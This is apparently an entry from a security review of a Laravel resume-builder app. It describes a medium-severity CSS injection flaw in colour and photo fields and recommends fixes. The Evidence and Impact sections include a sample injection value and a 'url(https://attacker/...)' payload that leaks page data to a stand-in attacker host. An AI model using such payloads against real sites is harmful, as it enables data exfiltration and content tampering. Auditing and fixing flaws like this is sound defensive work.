> Tracking ID: `SEC-07` · Severity: **Medium** · CWE-79 / CWE-116 / CWE-20
>
> Full context: `SECURITY_REVIEW.md` at the repository root

## Summary
Colours are placed into `style` attributes with HTML escaping only; semicolons and `url()` are still valid CSS, so an attacker can inject arbitrary declarations.

## Evidence
- `laravel/resources/views/pages/resumes.blade.php:41` — `style="display: inline-block; ... background: {{ $r->color }};"`.
- `laravel/resources/views/pages/resumes.blade.php:32` — `data-color="{{ $r->color }}"`.
- `js/render.js:1682` / `laravel/public/js/render.js` — `style="--cv-accent:${esc(color || defaultColor(template))}"`.
- `js/editor.js:451` — `photoPreview.style.backgroundImage = \`url("${photo}")\``; `photo` comes from the stored resume JSON.
- `laravel/app/Http/Controllers/ResumeController.php:88` — `color` is only `string|max:32`, so `red;background:url(//x)` (22 chars) is accepted.

## Impact
`{{ }}` and `escapeHtml()` stop attribute breakout but not CSS injection: injected `background-image: url(https://attacker/...)` leaks the page URL/referrer and can be used for UI redressing, data exfiltration via attribute selectors, or hiding/replacing content in a printed CV. `photo` can likewise inject CSS declarations or external requests.

## Remediation
- Enforce a hex-colour regex server-side and reject anything else; cast to a validated value before it reaches a view.
- Avoid inline `style` for user values — use a CSS custom property set from a validated value, or a class from a fixed palette.
- For images, allowlist `/^https?:\/\//` plus same-origin paths and `data:image/(png|jpeg|webp);base64,`; set `img.src` via DOM rather than string interpolation.
- Add `style-src` to the CSP (see SEC-14).
